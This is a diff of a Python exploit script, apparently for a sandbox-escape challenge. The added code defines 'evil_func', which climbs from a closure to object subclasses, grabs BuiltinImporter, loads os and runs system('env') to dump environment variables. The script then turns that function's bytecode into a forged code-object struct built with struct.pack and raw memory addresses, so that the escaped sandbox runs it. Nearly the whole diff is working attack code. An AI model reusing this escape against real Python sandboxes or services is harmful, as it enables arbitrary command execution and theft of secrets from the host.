@@ -7,21 +7,61 @@ import struct
 #     dis.opmap['LOAD_CONST'], 0, # load None
 #     dis.opmap['RETURN_VALUE'], 0 # return it
 # ])
-payload_consts = (None, 'hello world')
-payload_names = ('print',)
-payload = bytes([
-    dis.opmap['LOAD_GLOBAL'], 0, # load print
-    dis.opmap['LOAD_CONST'], 1, # load hello world
-    dis.opmap['CALL_FUNCTION'], 1, # print(...)
-    dis.opmap['LOAD_CONST'], 0, # load None
-    dis.opmap['RETURN_VALUE'], 0 # return it
-])
+
+### Test setup
+class Game:
+    def __init__(self):
+        pass
+    def get_board_size(self):
+        return 16
+get_board_size = Game().get_board_size
+log = print
+
+### Test compile
+steal_env_func = """
+def evil_func():
+  subs = get_board_size.__closure__[0].cell_contents.__class__.__bases__[0].__subclasses__()
+  Importer = None
+  for sub in subs:
+    if sub.__name__ == 'BuiltinImporter':
+      Importer = sub
+      break
+  imp = Importer()
+  imp.load_module('os').system('env')
+"""
+steal_env_code = compile(steal_env_func, '<dummy>', 'exec')
+print(steal_env_code.co_consts[0])
+print(steal_env_code.co_consts[0].co_consts)
+print(steal_env_code.co_consts[0].co_names)
+print(steal_env_code.co_consts[0].co_varnames)
+print(steal_env_code.co_consts[0].co_freevars)
+print(steal_env_code.co_consts[0].co_cellvars)
+print(steal_env_code.co_consts[0].co_filename)
+
+
+### Exploit
+# payload_consts = (None,)
+# payload_names = ('log', 'str', 'get_board_size','__closure__')
+# payload = bytes([
+#     dis.opmap['LOAD_GLOBAL'], 0, # load log
+#     dis.opmap['LOAD_GLOBAL'], 1, # load str
+#     dis.opmap['LOAD_GLOBAL'], 2, # load get_board_size
+#     dis.opmap['LOAD_ATTR'], 3, # get_board_size.__closure__
+#     dis.opmap['CALL_FUNCTION'], 1, # str(...)
+#     dis.opmap['CALL_FUNCTION'], 1, # log(...)
+#     dis.opmap['LOAD_CONST'], 0, # None
+#     dis.opmap['RETURN_VALUE'], 0 # return it
+# ])
+payload = steal_env_code.co_consts[0].co_code
+payload_consts = steal_env_code.co_consts[0].co_consts
+payload_names = steal_env_code.co_consts[0].co_names
+payload_varnames = steal_env_code.co_consts[0].co_varnames
 print('payload', payload)
 evil_struct = {
     'code': payload,
     'consts': payload_consts,
     'names': payload_names,
-    'varnames': (),
+    'varnames': payload_varnames,
     'freevars': (),
     'cellvars': (),
     'filename': '<dummy>',
@@ -29,6 +69,7 @@ evil_struct = {
     'lnotab': str(len(payload)).encode('utf-8') + b'\x00',
     'weakreflist': []
 }
+print(hex(id(evil_struct['code'])), struct.pack('P', id(evil_struct['code'])))
 evil_array = struct.pack(
     'iiPPPPPPPPPPPPP',
     0, # flags
@@ -56,6 +97,7 @@ for i in range(256**2):
     if i1 < 2**28 and i2 < 2**28: break
 evil_array = test_evil_array
 argcount = len(evil_array)
+print('argcount = ', argcount)
     
 # def f(): print('hello world')
 # evil_array = f.__code__
